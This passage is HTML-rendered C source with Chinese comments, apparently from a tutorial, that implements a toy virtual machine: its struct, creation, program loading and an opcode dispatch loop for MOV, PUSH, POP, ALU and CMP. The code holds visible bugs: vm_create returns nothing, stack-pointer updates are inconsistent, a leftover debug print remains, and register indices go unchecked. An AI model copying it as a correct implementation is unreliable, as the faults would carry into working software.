标志寄存器（用于保存比较结果）</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\">// 定义虚拟机结构体，包含内存、寄存器和运行状态等字段</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token class-name\">uint8_t</span> mem<span class=\"token punctuation\">[</span>MEM_SIZE<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 内存空间，每个单元 8 位（1 字节）</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token class-name\">uint16_t</span> reg<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>         <span class=\"token comment\">// 寄存器数组，每个寄存器 16 位（2 字节）</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">int</span> running<span class=\"token punctuation\">;</span>             <span class=\"token comment\">// 运行状态，0 表示停止，1 表示运行中</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token punctuation\">&#125;</span> VM<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token comment\">// 创建并初始化一个虚拟机实例，并返回指针</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>VM<span class=\"token operator\">*</span> <span class=\"token function\">vm_create</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    VM<span class=\"token operator\">*</span> vm <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>VM<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>        <span class=\"token comment\">// 分配内存空间给虚拟机实例</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>                    <span class=\"token comment\">// 将程序计数器置为 0（从内存地址 0 开始执行）</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>SP<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> MEM_SIZE <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>         <span class=\"token comment\">// 将栈指针置为内存最高地址 - 2（栈从高地址向低地址增长）</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>FLG<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>                   <span class=\"token comment\">// 将标志寄存器置为 0（无比较结果）</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    vm<span class=\"token operator\">-></span>running <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>                    <span class=\"token comment\">// 将运行状态置为 1（开始执行）</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token comment\">// 初始化其他寄存器为 0</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>R0<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>R1<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>R2<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>R3<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>R4<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token comment\">// 加载一段程序到虚拟机的内存中，并返回加载后的程序长度（字节数）</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">vm_load</span><span class=\"token punctuation\">(</span>VM<span class=\"token operator\">*</span> vm<span class=\"token punctuation\">,</span> <span class=\"token class-name\">uint8_t</span><span class=\"token operator\">*</span> prog<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    <span class=\"token keyword\">int</span> len <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>                        <span class=\"token comment\">// 初始化程序长度为 0</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>prog <span class=\"token operator\">!=</span> HLT<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>              <span class=\"token comment\">// 循环读取程序字节，直到遇到 HLT 指令</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>        vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> len<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>prog<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 将当前字节写入虚拟机内存中，相对于程序计数器的偏移地址</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>        prog<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>                         <span class=\"token comment\">// 指向下一个字节</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>        len<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>                          <span class=\"token comment\">// 程序长度加 1</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>prog<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>     vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> len<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> HLT<span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 将 HLT 指令写入虚拟机内存中，作为程序的结束标志</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    <span class=\"token keyword\">return</span> len<span class=\"token punctuation\">;</span>                     <span class=\"token comment\">// 返回程序长度（包含 HLT 指令）</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre><span class=\"token comment\">// 定义一个执行函数，接受一个虚拟机实例作为参数</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">vm_exec</span><span class=\"token punctuation\">(</span>VM<span class=\"token operator\">*</span> vm<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>    <span class=\"token class-name\">uint8_t</span> dst<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>    <span class=\"token class-name\">uint8_t</span> src<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>vm<span class=\"token operator\">-></span>running<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// 循环执行，直到运行状态为 0</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>        <span class=\"token class-name\">uint8_t</span> op <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 从内存中读取当前指令</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>        <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>op<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// 根据指令类型进行分支处理</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>            <span class=\"token keyword\">case</span> MOV<span class=\"token operator\">:</span> <span class=\"token comment\">// 移动数据 </span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>                <span class=\"token punctuation\">&#123;</span>dst <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 读取目标寄存器编号（第一个操作数）</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>                src <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 读取源寄存器编号（第二个操作数）</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>                vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>dst<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>src<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 将源寄存器的值赋给目标寄存器</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>                vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>\t\t\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>\t\t\t\tdst <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 读取目标寄存器编号（第一个操作数）</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>                src <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>\t\t\t\tvm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>dst<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> src<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 将目标值赋给目标寄存器</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>                vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 将程序计数器增加 4（跳过指令和操作数）</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>            <span class=\"token keyword\">case</span> PUSH<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>\t\t\tdst <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>\t\t\tvm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>\t\t\t<span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>\t\t\t\tvm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span><span class=\"token operator\">--</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>SP<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>\t\t\t    vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>SP<span class=\"token punctuation\">]</span><span class=\"token operator\">--</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>\t\t\t<span class=\"token keyword\">default</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>\t\t\t    vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>SP<span class=\"token punctuation\">]</span><span class=\"token operator\">--</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>            <span class=\"token keyword\">case</span> POP<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>\t\t\tdst <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>\t\t\tvm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>\t\t\t<span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>\t\t\t\tvm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span><span class=\"token operator\">++</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>SP<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>\t\t\t    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span><span class=\"token operator\">++</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>SP<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>\t\t\t<span class=\"token keyword\">default</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>\t\t\t    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>SP<span class=\"token punctuation\">]</span><span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> ALU<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>\t\t\tdst <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>\t\t\t<span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>\t\t\t\tdst <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 读取目标寄存器编号（第一个操作数）</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>                src <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 读取源寄存器编号（第二个操作数）</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>                vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>dst<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>src<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 加法</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>\t\t\t    dst <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 读取目标寄存器编号（第一个操作数）</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>                src <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 读取源寄存器编号（第二个操作数）</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>                vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>dst<span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>src<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 减法</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>                <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>\t\t\t    dst <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 读取目标寄存器编号（第一个操作数）</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>                src <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 读取源寄存器编号（第二个操作数）</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>                vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>dst<span class=\"token punctuation\">]</span> <span class=\"token operator\">*=</span> vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>src<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 乘法</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre>                <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>\t\t\t    dst <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 读取目标寄存器编号（第一个操作数）</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>                src <span class=\"token operator\">=</span> vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 读取源寄存器编号（第二个操作数）</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre>                vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>dst<span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>src<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 异或</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>                <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre>\t\t\t<span class=\"token keyword\">default</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>\t\t\tvm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"149\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> CMP<span class=\"token operator\">:</span><span class=\"token comment\">// 比较的是后面 2 个操作数代表的寄存器的值</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span><span 